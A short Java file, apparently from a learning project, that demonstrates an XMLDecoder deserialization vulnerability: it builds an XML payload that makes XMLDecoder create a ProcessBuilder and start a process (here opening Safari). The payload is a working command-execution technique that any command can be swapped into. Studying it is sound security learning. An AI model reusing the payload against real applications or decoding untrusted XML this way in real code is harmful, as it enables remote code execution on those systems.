package com.learning.javalearning.xml;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;

/**
 * xml执行漏洞
 * createdAt 2023/12/25
 **/
public class VulnerabilityXML {

    public static void main(String[] args) {
        String xml = new StringBuilder().append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
                .append("<java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\">")
                .append("    <object class=\"java.lang.ProcessBuilder\">")
                .append("        <array class=\"java.lang.String\" length=\"3\">")
                .append("            <void index=\"0\">")
                .append("                <string>open</string>")
                .append("            </void>")
                .append("            <void index=\"1\">")
                .append("                <string>-a</string>")
                .append("            </void>")
                .append("            <void index=\"2\">")
                .append("                <string>safari</string>")
                .append("            </void>")
                .append("        </array>")
                .append("        <void method=\"start\" />")
                .append("    </object>")
                .append("</java>").toString();
        XMLDecoder xd = null;
        try {
            xd = new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        ProcessBuilder s2 = (ProcessBuilder) xd.readObject();
        System.out.println(s2.command());
        xd.close();
    }
}
